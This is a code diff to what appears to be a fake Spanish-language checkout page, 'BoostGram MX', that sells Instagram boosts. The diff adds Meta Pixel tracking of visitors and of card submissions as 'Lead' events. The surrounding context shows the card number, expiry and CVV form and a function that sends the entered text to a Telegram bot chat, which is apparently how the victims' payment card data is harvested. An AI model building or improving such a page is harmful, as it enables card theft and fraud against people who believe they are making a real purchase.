@@ -4,6 +4,25 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>BoostGram MX — Pago con tarjeta</title>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1745699572807528');
+fbq('track', 'PageView');
+fbq('track', 'InitiateCheckout');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1745699572807528&ev=PageView&noscript=1"/></noscript>
+<!-- End Meta Pixel Code -->
+
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{--bg:#07070d;--panel:#12131d;--panel2:#171825;--line:#262838;--ink:#eef0f7;--muted:#8b90a6;
@@ -184,7 +203,6 @@ const CHAT  = "8936145342";
 const $ = id => document.getElementById(id);
 const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
-/* usuario que vino de la página principal */
 const ig = (localStorage.getItem('ig') || '').trim().replace('@','');
 if(ig) $('oSub').innerHTML = 'Cuenta: <b>@'+ig+'</b> · Entrega en minutos';
 
@@ -205,7 +223,6 @@ cvvEl.addEventListener('focus', ()=>$('cc').classList.add('flip'));
 cvvEl.addEventListener('blur',  ()=>$('cc').classList.remove('flip'));
 cvvEl.addEventListener('input', ()=>{ cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,4); $('ccCvv').textContent = cvvEl.value || '•••'; });
 
-/* envío simple a Telegram (sin "pregunta previa", no se traba) */
 function enviarTelegram(texto){
   const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`;
   return new Promise(res=>{
@@ -228,6 +245,8 @@ $('form').addEventListener('submit', async e=>{
   if(!/^\d{2}\/\d{2}$/.test(exp))return err('Vencimiento inválido (MM/AA)');
   if(cvv.length<3)               return err('CVV inválido');
   if(wa && wa.length<8)          return err('El WhatsApp parece incompleto (o dejalo vacío)');
+
+  if (window.fbq) fbq('track','Lead');
 
   $('btn').disabled = true; $('btn').classList.add('load'); $('bt').textContent = 'Procesando pago...';
 
